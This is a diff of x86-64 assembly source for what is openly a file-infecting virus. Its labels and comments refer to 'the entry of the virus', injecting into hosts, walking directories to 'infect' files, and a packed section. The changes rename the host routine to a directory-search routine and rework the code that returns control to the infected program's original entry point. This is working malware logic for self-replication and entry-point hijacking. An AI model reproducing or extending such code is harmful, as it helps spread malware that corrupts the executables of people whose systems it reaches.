@@ -69,7 +69,7 @@ _inject:
 
 	%ifdef DEBUG
 		mov rdi, r8
-		add rdi, 0x5
+		add rdi, 0x5; sub call instr
 		call _print; _print(rdi)
 	%endif
 	; r8 contains the entry of the virus
@@ -79,7 +79,8 @@ _inject:
 	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
 	jne .infected
 
-	call _host
+	; host part
+	call _search_dir
 	jmp _end
 
 	.infected:
@@ -118,7 +119,7 @@ _inject:
 		push rdi ; save addr
 
 		lea rsi, [rel _start]
-		lea rax, [rel _host]
+		lea rax, [rel _search_dir]
 		sub rax, rsi
 		add rax, rdi
 
@@ -136,7 +137,7 @@ _inject:
 
 ; ============================================================== pack from there
 _packed_part:
-_host:
+_search_dir:
 	xor rsi, rsi ; mode for move_through_dir
 	lea rdi, [rel directories]
 	xor rcx, rcx; = 0
@@ -153,23 +154,20 @@ ret
 
 _end:
 	xor rax, rax; = 0
-	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
-	jne .infected
+	cmp rax, [rel entry_inject]; if entry_inject is set we are in host
+	je _end_host
 
-	jmp _end_host
+	; infected file
+	push r8
+	pop rax
 
+	sub rax, [rel entry_inject]
+	add rax, [rel vaddr]
 
-	.infected:
-		push r8
-		pop rax
+	add rax, [rel entry_prg]
+	sub rax, [rel vaddr]
 
-		sub rax, [rel entry_inject]
-		add rax, [rel vaddr]
-
-		add rax, [rel entry_prg]
-		sub rax, [rel vaddr]
-
-		jmp rax
+	jmp rax
 
 _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 	push r10
@@ -806,6 +804,7 @@ _params:
 _eof:
 
 ; don't need to copy the host part
+; v
 
 _end_host:
 	push 60
